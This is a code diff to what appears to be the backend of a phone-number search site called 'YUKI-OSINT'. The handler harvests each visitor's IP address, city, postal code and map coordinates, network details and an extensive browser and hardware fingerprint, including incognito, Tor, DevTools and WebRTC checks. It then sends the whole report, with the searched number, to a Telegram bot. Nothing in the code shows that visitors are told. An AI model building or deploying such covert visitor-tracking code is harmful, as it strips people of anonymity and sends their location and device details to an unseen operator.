@@ -18,7 +18,6 @@ export default async function handler(request) {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    // ===== IP =====
     const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim()
             || request.headers.get('x-real-ip')
             || request.headers.get('cf-connecting-ip')
@@ -69,12 +68,8 @@ export default async function handler(request) {
     // ===== TOR DETECTION =====
     let torDetected = 'No';
     try {
-      if (ipInfo.asname && ipInfo.asname.toLowerCase().includes('tor')) {
-        torDetected = 'Yes (ASN)';
-      }
-      if (ipInfo.isp && ipInfo.isp.toLowerCase().includes('tor')) {
-        torDetected = 'Yes (ISP)';
-      }
+      if (ipInfo.asname && ipInfo.asname.toLowerCase().includes('tor')) torDetected = 'Yes';
+      if (ipInfo.isp && ipInfo.isp.toLowerCase().includes('tor')) torDetected = 'Yes';
     } catch {}
 
     // ===== CLIENT DATA =====
@@ -140,128 +135,87 @@ export default async function handler(request) {
     else if (suspicion >= 40) suspicionLevel = 'HIGH';
     else if (suspicion >= 20) suspicionLevel = 'MEDIUM';
 
+    // ===== LINE HELPER =====
+    const line = (label, value) => {
+      const l = String(label).padEnd(20, '-');
+      return `${l}${value}`;
+    };
+
     // ===== TXT FILE CONTENT =====
-    const fileContent = `=====================================================
-              NEW SEARCH DETECTED
-=====================================================
+    const fileContent =
+`YUKI-OSINT :: SEARCH REPORT
 
-SEARCH QUERY
------------------------------------------------------
-  Type              : ${searchType}
-  Number            : ${searchedNumber}
-
-THREAT ASSESSMENT
------------------------------------------------------
-  Level             : ${suspicionLevel}
-  Score             : ${suspicion}/100
-  Flags             : ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}
-
-=====================================================
-                  SECURITY CHECKS
-=====================================================
-  Incognito         : ${incognito}
-  Ad Blocker        : ${adBlocker}
-  Tor Network       : ${torDetected}
-  Bot Detection     : ${isBot}
-  Bot Score         : ${botScore}/12
-  Bot Details       : ${botDetails}
-  Headless Browser  : ${headless}
-  Automation        : ${automation}
-  DevTools Open     : ${devtools}
-  WebRTC IP         : ${vpnWebrtc}
-
-=====================================================
-                  IP INFORMATION
-=====================================================
-  IP Address        : ${ip}
-  ISP               : ${ipInfo.isp}
-  Organization      : ${ipInfo.org}
-  ASN               : ${ipInfo.as}
-  AS Name           : ${ipInfo.asname}
-  Reverse DNS       : ${ipInfo.reverse}
-
-LOCATION
------------------------------------------------------
-  Country           : ${ipInfo.country}
-  City              : ${ipInfo.city}
-  Region            : ${ipInfo.regionName} (${ipInfo.region})
-  Postal Code       : ${ipInfo.zip}
-  Coordinates       : ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
-  Timezone          : ${ipInfo.timezone}
-  Google Maps       : ${ipInfo.lat && ipInfo.lon ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}` : 'Not available'}
-
-NETWORK FLAGS
------------------------------------------------------
-  Proxy/VPN         : ${ipInfo.proxy ? 'Yes' : 'No'}
-  Hosting           : ${ipInfo.hosting ? 'Yes' : 'No'}
-  Mobile Network    : ${ipInfo.mobile ? 'Yes' : 'No'}
-
-=====================================================
-                DEVICE INFORMATION
-=====================================================
-  Device            : ${device}
-  Operating System  : ${os}
-  Browser           : ${browser}
-  Vendor            : ${vendor}
-  Platform          : ${platform}
-
-DISPLAY
------------------------------------------------------
-  Screen            : ${screen}
-  Available Screen  : ${screenAvail}
-  Orientation       : ${orientation}
-  Color Depth       : ${colorDepth}
-  Pixel Ratio       : ${pixelRatio}
-
-HARDWARE
------------------------------------------------------
-  CPU Cores         : ${cores}
-  RAM               : ${memory} GB
-  GPU               : ${gpu}
-  GPU Vendor        : ${gpuVendor}
-  Battery           : ${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}
-  Touch Support     : ${touch}
-
-BROWSER SETTINGS
------------------------------------------------------
-  Language          : ${language}
-  All Languages     : ${languages}
-  Timezone          : ${browserTZ}
-  Cookies           : ${cookies}
-  Do Not Track      : ${doNotTrack}
-  Online            : ${online}
-  Connection        : ${connection}
-  Page Load Time    : ${pageLoadTime} ms
-
-=====================================================
-                REQUEST METADATA
-=====================================================
-  Referrer          : ${referer}
-  Accept Language   : ${acceptLang}
-  Timestamp         : ${timestamp}
-
-=====================================================
-                  USER AGENT
-=====================================================
-${userAgent}
-
-=====================================================
-                  END OF REPORT
-=====================================================
+${line('Type', searchType)}
+${line('Searched', searchedNumber)}
+${line('Threat Level', suspicionLevel)}
+${line('Suspicion Score', `${suspicion}/100`)}
+${line('Flags', suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None')}
+${line('IP Address', ip)}
+${line('Country', ipInfo.country)}
+${line('City', ipInfo.city)}
+${line('Region', `${ipInfo.regionName} (${ipInfo.region})`)}
+${line('Postal Code', ipInfo.zip)}
+${line('Coordinates', `${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}`)}
+${line('Timezone', ipInfo.timezone)}
+${line('ISP', ipInfo.isp)}
+${line('Organization', ipInfo.org)}
+${line('ASN', ipInfo.as)}
+${line('AS Name', ipInfo.asname)}
+${line('Reverse DNS', ipInfo.reverse)}
+${line('Proxy/VPN', ipInfo.proxy ? 'Yes' : 'No')}
+${line('Hosting', ipInfo.hosting ? 'Yes' : 'No')}
+${line('Mobile Network', ipInfo.mobile ? 'Yes' : 'No')}
+${line('Device', device)}
+${line('OS', os)}
+${line('Browser', browser)}
+${line('Vendor', vendor)}
+${line('Platform', platform)}
+${line('Screen', screen)}
+${line('Available Screen', screenAvail)}
+${line('Orientation', orientation)}
+${line('Color Depth', colorDepth)}
+${line('Pixel Ratio', pixelRatio)}
+${line('CPU Cores', cores)}
+${line('RAM', `${memory} GB`)}
+${line('GPU', gpu)}
+${line('GPU Vendor', gpuVendor)}
+${line('Battery', `${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}`)}
+${line('Touch', touch)}
+${line('Language', language)}
+${line('All Languages', languages)}
+${line('Browser TZ', browserTZ)}
+${line('Cookies', cookies)}
+${line('Do Not Track', doNotTrack)}
+${line('Online', online)}
+${line('Connection', connection)}
+${line('Page Load', `${pageLoadTime} ms`)}
+${line('Incognito', incognito)}
+${line('Ad Blocker', adBlocker)}
+${line('Tor', torDetected)}
+${line('Bot', isBot)}
+${line('Bot Score', `${botScore}/12`)}
+${line('Bot Details', botDetails)}
+${line('Headless', headless)}
+${line('Automation', automation)}
+${line('DevTools', devtools)}
+${line('WebRTC IP', vpnWebrtc)}
+${line('Referrer', referer)}
+${line('Accept Lang', acceptLang)}
+${line('Timestamp', timestamp)}
+${line('User Agent', userAgent)}
 `;
 
-    // ===== TXT FILE BANAO =====
-    const fileName = `search_${searchedNumber}_${Date.now()}.txt`;
+    // ===== FILE BANAO =====
+    const fileName = `YUKI_OSINT_${searchedNumber}_${Date.now()}.txt`;
     const blob = new Blob([fileContent], { type: 'text/plain' });
 
-    // ===== FORM DATA BANAO =====
+    // ===== FORM DATA =====
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('document', blob, fileName);
-    formData.append('caption', `New search detected: ${searchedNumber}\nThreat Level: ${suspicionLevel}`);
-    formData.append('parse_mode', 'HTML');
+    formData.append('caption', `Search: ${searchedNumber} | Threat: ${suspicionLevel}`);
 
-    // ===== TELEGRAM PE FILE BHEJO =====
+    // ===== TELEGRAM PE BHEJO =====
     const tgResponse = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
       {
